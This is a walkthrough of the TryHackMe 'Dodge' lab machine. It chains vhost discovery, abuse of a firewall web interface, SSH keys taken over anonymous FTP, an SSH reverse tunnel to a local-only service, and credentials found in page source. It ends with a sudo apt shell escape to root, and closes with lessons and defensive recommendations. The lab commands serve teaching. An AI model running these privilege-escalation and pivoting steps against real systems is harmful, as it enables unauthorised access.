````md
# TryHackMe - Dodge Writeup

> **Platform:** TryHackMe  
> **Machine:** Dodge  
> **Difficulty:** Medium  
> **Topics:** Pivoting, Network Evasion, Linux Privilege Escalation  
> **Target IP:** `10.49.137.222`

---

# Introduction

Today we are back with another TryHackMe challenge named **Dodge**.

This machine focuses on **Pivoting and Network Evasion** and requires us to enumerate exposed services, identify hidden virtual hosts, manipulate firewall rules, access an internal service, and finally escalate privileges to root.

The main target IP is:

```text
10.49.137.222
````

---

# Part 1 - Initial Enumeration

We start with a full TCP port scan.

```bash
nmap -p- 10.49.137.222
```

The scan returns:

```text
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```

Only three ports are initially exposed:

| Port | Service |
| ---- | ------- |
| 22   | SSH     |
| 80   | HTTP    |
| 443  | HTTPS   |

---

# Service and Version Detection

Next, we perform service and version detection:

```bash
nmap -sC -sV 10.49.137.222
```

Important results:

```text
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3
80/tcp  open  http     Apache httpd 2.4.41
443/tcp open  ssl/http Apache httpd 2.4.41
```

Both HTTP and HTTPS initially return:

```text
403 Forbidden
```

The HTTPS certificate, however, provides an important clue.

---

# Part 2 - SSL Certificate Enumeration

The certificate contains multiple hostnames.

The interesting domains include:

```text
dodge.thm
www.dodge.thm
blog.dodge.thm
dev.dodge.thm
touch-me-not.dodge.thm
netops-dev.dodge.thm
ball.dodge.thm
```

This is an important discovery because the web server is likely configured with multiple virtual hosts.

We add the discovered domains to:

```text
/etc/hosts
```

For example:

```text
10.49.137.222 dodge.thm
10.49.137.222 www.dodge.thm
10.49.137.222 blog.dodge.thm
10.49.137.222 dev.dodge.thm
10.49.137.222 touch-me-not.dodge.thm
10.49.137.222 netops-dev.dodge.thm
10.49.137.222 ball.dodge.thm
```

---

# Part 3 - Discovering netops-dev

Among the discovered virtual hosts, the most interesting one is:

```text
netops-dev.dodge.thm
```

Opening:

```text
https://netops-dev.dodge.thm
```

returns a mostly blank page.

Instead of stopping here, we inspect the page source.

The source references:

```text
/firewall.js
```

Opening:

```text
https://netops-dev.dodge.thm/firewall.js
```

reveals JavaScript containing an interesting endpoint:

```javascript
fetch('firewall10110.php', {
    method: 'GET',
    headers: {
        'Content-Type': 'application/json'
    }
})
```

This suggests that the page interacts with a firewall management endpoint.

---

# Part 4 - Hidden Functionality

The source also contains a hidden section:

```html
<div class="container" style="display:none;">
```

Changing the page behavior allows the hidden functionality to become visible.

This exposes an upload page and additional firewall-related functionality.

The important endpoint is:

```text
firewall*.php
```

which provides access to UFW rule management.

This is particularly interesting because it allows us to manipulate the firewall from the web application.

---

# Firewall Manipulation

The application allows UFW rules to be modified.

For example:

```bash
sudo ufw allow 21
```

opens TCP port `21`.

After allowing FTP, port 21 becomes accessible.

This gives us a new service to enumerate.

---

# Part 5 - FTP Enumeration

FTP is now available on:

```text
21/tcp
```

We connect using FTP.

Anonymous access is allowed.

```bash
ftp 10.49.137.222
```

Inside the FTP session:

```text
ftp> ls
```

we see:

```text
-r--------    1 1003 1003 38 Jun 19 2023 user.txt
```

Initially, trying to download the file fails:

```text
ftp> get user.txt
550 Failed to open file.
```

The current directory is:

```text
ftp> pwd
Remote directory: /
```

Further enumeration shows that the FTP root is effectively associated with another user's home directory.

---

# FTP Directory Enumeration

Listing the directory reveals:

```text
-rwxr-xr-x    1 1003 1003 807 Feb 25 2020 .profile
drwxr-xr-x    2 1003 1003 4096 Jun 22 2023 .ssh
-r--------    1 1003 1003 38 Jun 19 2023 user.txt
```

The `.ssh` directory is accessible.

Entering it:

```bash
ftp> cd .ssh
ftp> ls
```

reveals:

```text
-rwxr-xr-x    1 1003 1003  573 Jun 22 2023 authorized_keys
-r--------    1 1003 1003 2610 Jun 22 2023 id_rsa
-rwxr-xr-x    1 1003 1003 2610 Jun 22 2023 id_rsa_backup
```

The presence of private SSH keys is extremely interesting.

---

# Part 6 - Extracting the SSH Key

We download the relevant files from FTP.

The `authorized_keys` file indicates the associated user:

```text
challenger@thm-lamp
```

The private key can then be used for SSH authentication.

Because SSH requires restrictive permissions on private keys, we change the permissions locally:

```bash
chmod 600 id_rsa_backup
```

Then connect:

```bash
ssh challenger@10.49.137.222 -i id_rsa_backup
```

We successfully obtain SSH access as:

```text
challenger
```

At this stage, the first user-level access has been achieved.

---

# Part 7 - Privilege Escalation Stage 1

After obtaining access as `challenger`, we enumerate the system.

The machine contains several users, including:

```text
cobra
tryhackme
ubuntu
challenger
```

We also enumerate local network services.

```bash
ss -utlnp
```

Important results include:

```text
127.0.0.1:38753
127.0.0.1:10000
0.0.0.0:22
*:80
*:21
*:443
```

The most interesting internal service is:

```text
127.0.0.1:10000
```

This service is only listening on localhost.

Therefore, it cannot be directly accessed from our attacking machine.

---

# Part 8 - Pivoting to the Internal Service

We create an SSH tunnel to expose the internal service.

```bash
ssh -N -R 127.0.0.1:8087:127.0.0.1:10000 kali@192.168.138.6
```

This forwards the remote machine's:

```text
127.0.0.1:10000
```

to:

```text
127.0.0.1:8087
```

on our Kali machine.

This is the pivoting stage of the machine.

---

# Apache Virtual Host Enumeration

Since Apache is running, we also investigate its virtual host configuration.

The command:

```bash
apache2ctl -S
```

can provide information about the configured virtual hosts.

During enumeration of the internal web application, interesting source code is discovered.

The page contains fields for a username and password.

The source includes:

```html
<input type="text" id="username" name="username" class="form-control">
```

and:

```html
<!--
<input type="password"
       id="password"
       name="password"
       class="form-control"
       value="^5hf5w&CAt9sPr@">
-->
```

The credentials are exposed directly in the page source.

---

# Part 9 - Credential Discovery

Further examination of the dashboard reveals:

```text
cobra / mz4%o7BGum#TTu
```

These credentials can be used to switch users.

From the `challenger` shell:

```bash
su cobra
```

Enter the discovered password:

```text
mz4%o7BGum#TTu
```

We successfully become:

```text
cobra
```

---

# Part 10 - Privilege Escalation to Root

Now we enumerate sudo permissions:

```bash
sudo -l
```

The result is:

```text
Matching Defaults entries for cobra:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User cobra may run the following commands on ip-10-49-137-222:

    (ALL) NOPASSWD: /usr/bin/apt
```

This is the critical privilege escalation finding.

The user `cobra` can execute:

```text
/usr/bin/apt
```

as root without a password.

---

# Exploiting sudo apt

According to GTFOBins, `apt` can be abused when it is available through sudo.

We use:

```bash
sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh
```

The command executes `/bin/sh` with root privileges.

Checking the current identity:

```bash
id
```

returns:

```text
uid=0(root) gid=0(root) groups=0(root)
```

We now have root access.

---

# Root Flag

The final flag is located at:

```text
/root/root.txt
```

Read it with:

```bash
cat /root/root.txt
```

This completes the machine.

---

# Complete Attack Chain

```text
                         DODGE
                           │
                           ▼
                    10.49.137.222
                           │
                           ▼
                     Nmap Enumeration
                           │
                           ▼
                  HTTP / HTTPS / SSH
                           │
                           ▼
                 SSL Certificate Enum
                           │
                           ▼
                Virtual Host Discovery
                           │
                           ▼
              netops-dev.dodge.thm
                           │
                           ▼
                      firewall.js
                           │
                           ▼
                  Firewall Management
                           │
                           ▼
                    UFW Rule Abuse
                           │
                           ▼
                       FTP :21
                           │
                           ▼
                  Anonymous FTP Access
                           │
                           ▼
                       .ssh/
                           │
                           ▼
                    id_rsa_backup
                           │
                           ▼
                    SSH as challenger
                           │
                           ▼
                 Internal Port Enumeration
                           │
                           ▼
                    127.0.0.1:10000
                           │
                           ▼
                     SSH Pivoting
                           │
                           ▼
                 Internal Web Application
                           │
                           ▼
                  Credentials in Source
                           │
                           ▼
                         cobra
                           │
                           ▼
                       sudo -l
                           │
                           ▼
                    sudo /usr/bin/apt
                           │
                           ▼
                         root
                           │
                           ▼
                       root.txt
```

---

# Credentials Discovered

## Challenger

```text
Username: challenger
Authentication: SSH private key
Key: id_rsa_backup
```

## Cobra

```text
Username: cobra
Password: mz4%o7BGum#TTu
```

---

# Important Hosts

```text
dodge.thm
www.dodge.thm
blog.dodge.thm
dev.dodge.thm
touch-me-not.dodge.thm
netops-dev.dodge.thm
ball.dodge.thm
```

The most important discovery was:

```text
netops-dev.dodge.thm
```

---

# Important Ports

| Port  | Service              | Initial State                  |
| ----- | -------------------- | ------------------------------ |
| 22    | SSH                  | Open                           |
| 80    | HTTP                 | Open                           |
| 443   | HTTPS                | Open                           |
| 21    | FTP                  | Initially closed, later opened |
| 10000 | Internal Web Service | Localhost only                 |
| 38753 | Internal Service     | Localhost only                 |

---

# Important Files and Endpoints

```text
/firewall.js
/firewall10110.php
/.ssh/authorized_keys
/.ssh/id_rsa
/.ssh/id_rsa_backup
/root/root.txt
```

---

# Key Commands

## Full Port Scan

```bash
nmap -p- 10.49.137.222
```

## Service Detection

```bash
nmap -sC -sV 10.49.137.222
```

## SSH With Recovered Key

```bash
chmod 600 id_rsa_backup

ssh challenger@10.49.137.222 -i id_rsa_backup
```

## Internal Service Enumeration

```bash
ss -utlnp
```

## SSH Pivot

```bash
ssh -N -R 127.0.0.1:8087:127.0.0.1:10000 kali@192.168.138.6
```

## Switch User

```bash
su cobra
```

## Sudo Enumeration

```bash
sudo -l
```

## Final Privilege Escalation

```bash
sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh
```

---

# Lessons Learned

## 1. SSL Certificates Can Reveal Attack Surface

The HTTPS certificate exposed several internal and development hostnames.

Instead of only testing the main domain, certificate SAN entries should always be investigated.

In this case, the certificate revealed:

```text
netops-dev.dodge.thm
```

which became the key entry point.

---

## 2. Source Code Can Reveal Hidden Functionality

The `netops-dev` page appeared almost empty.

However, inspecting its JavaScript revealed:

```text
firewall.js
```

which then exposed:

```text
firewall10110.php
```

Source-code inspection can therefore reveal functionality that is not obvious from the UI.

---

## 3. Firewall Rules Can Become an Attack Surface

The web application exposed functionality that allowed UFW rules to be changed.

By allowing:

```text
21/tcp
```

we exposed an FTP service that was not initially reachable.

This demonstrates why firewall management interfaces must be strongly protected.

---

## 4. Anonymous FTP Can Expose Sensitive Files

Once FTP was opened, anonymous access provided access to:

```text
.ssh/
```

including:

```text
id_rsa
id_rsa_backup
authorized_keys
```

Private SSH keys should never be exposed through an anonymous file transfer service.

---

## 5. Internal Services Still Matter

The service on:

```text
127.0.0.1:10000
```

was invisible from the external network.

However, after obtaining a shell, we discovered it with:

```bash
ss -utlnp
```

and accessed it through SSH port forwarding.

---

## 6. Pivoting Expands the Attack Surface

SSH tunneling allowed us to move from an externally compromised host into an otherwise inaccessible internal service.

The basic flow was:

```text
Attacker
   ↓
SSH
   ↓
Compromised Host
   ↓
127.0.0.1:10000
   ↓
Internal Application
```

---

## 7. Never Store Credentials in Source Code

The internal application exposed credentials directly in its HTML source.

The discovered credentials eventually allowed us to switch from:

```text
challenger
```

to:

```text
cobra
```

Sensitive credentials should never be hardcoded or exposed through client-side source code.

---

## 8. Sudo Permissions Must Be Restricted

The final escalation was possible because `cobra` could execute:

```text
/usr/bin/apt
```

as root without a password.

This resulted in:

```text
cobra
  ↓
sudo apt
  ↓
/bin/sh
  ↓
root
```

Sudo permissions should be restricted to the minimum commands required for legitimate administrative tasks.

---

# Defensive Recommendations

### Virtual Hosts

* Review exposed development and testing virtual hosts.
* Avoid exposing development environments to untrusted networks.
* Do not rely on obscurity of hostnames.

### Firewall Management

* Restrict access to firewall management interfaces.
* Require authentication and authorization.
* Never expose arbitrary firewall rule modification to untrusted users.

### FTP

* Disable anonymous FTP where it is not required.
* Never expose SSH private keys through FTP.
* Restrict directory traversal and file permissions.

### SSH

* Protect private keys with strong permissions.
* Use strong passphrases.
* Rotate keys after suspected exposure.
* Avoid storing backups of private keys in accessible locations.

### Internal Services

* Properly authenticate internal applications.
* Do not assume localhost-only services are automatically safe.
* Apply authorization controls to internal administration interfaces.

### Credentials

* Never hardcode passwords in HTML or JavaScript.
* Store secrets securely.
* Use environment-based secret management where appropriate.

### Sudo

Avoid broad permissions such as:

```text
(ALL) NOPASSWD: /usr/bin/apt
```

when a more restricted command or administrative mechanism can be used.

---

# Final Attack Path

```text
Nmap
  ↓
HTTPS Certificate
  ↓
Virtual Host Enumeration
  ↓
netops-dev.dodge.thm
  ↓
firewall.js
  ↓
Firewall Rule Manipulation
  ↓
FTP
  ↓
Anonymous Access
  ↓
SSH Private Key
  ↓
challenger
  ↓
Internal Port Enumeration
  ↓
127.0.0.1:10000
  ↓
SSH Pivot
  ↓
Internal Web Application
  ↓
Credentials in Source
  ↓
cobra
  ↓
sudo -l
  ↓
APT Abuse
  ↓
root
```

---

# Conclusion

The **Dodge** machine was a good demonstration of how an attack can develop through multiple layers of network and application enumeration.

The initial scan exposed only:

```text
22/tcp
80/tcp
443/tcp
```

but the HTTPS certificate revealed several virtual hosts.

The discovery of:

```text
netops-dev.dodge.thm
```

led to the `firewall.js` file and ultimately exposed firewall-management functionality.

By allowing FTP through the firewall, anonymous FTP access became available and exposed SSH private keys.

The recovered key provided SSH access as:

```text
challenger
```

From there, local network enumeration revealed an internal service on:

```text
127.0.0.1:10000
```

SSH port forwarding allowed the service to be accessed externally.

The internal application exposed credentials that allowed us to switch to:

```text
cobra
```

Finally, `sudo -l` revealed that `cobra` could execute `apt` as root without a password.

Abusing the `apt` execution resulted in:

```text
uid=0(root)
```

and completed the machine.

The complete progression was:

```text
Virtual Host Discovery
        ↓
Firewall Manipulation
        ↓
Anonymous FTP
        ↓
SSH Key Exposure
        ↓
challenger
        ↓
Internal Service Discovery
        ↓
SSH Pivoting
        ↓
Credential Disclosure
        ↓
cobra
        ↓
sudo apt
        ↓
root
```

This machine highlights the importance of looking beyond the initially exposed services and understanding how seemingly separate weaknesses can be chained together to achieve full system compromise.

---

# Skills Practiced

* Nmap
* Service Enumeration
* HTTPS Certificate Enumeration
* Virtual Host Enumeration
* `/etc/hosts` Configuration
* Burp Suite
* Source Code Analysis
* JavaScript Enumeration
* UFW Enumeration
* Firewall Rule Manipulation
* FTP Enumeration
* Anonymous FTP
* SSH Key Extraction
* SSH Authentication
* Linux Enumeration
* `ss` Network Enumeration
* SSH Port Forwarding
* Pivoting
* Internal Service Enumeration
* Credential Discovery
* Sudo Enumeration
* GTFOBins
* Linux Privilege Escalation

---

**Machine:** Dodge
**Platform:** TryHackMe
**Difficulty:** Medium
**Focus:** Pivoting & Network Evasion
**Target IP:** `10.49.137.222`

```
```
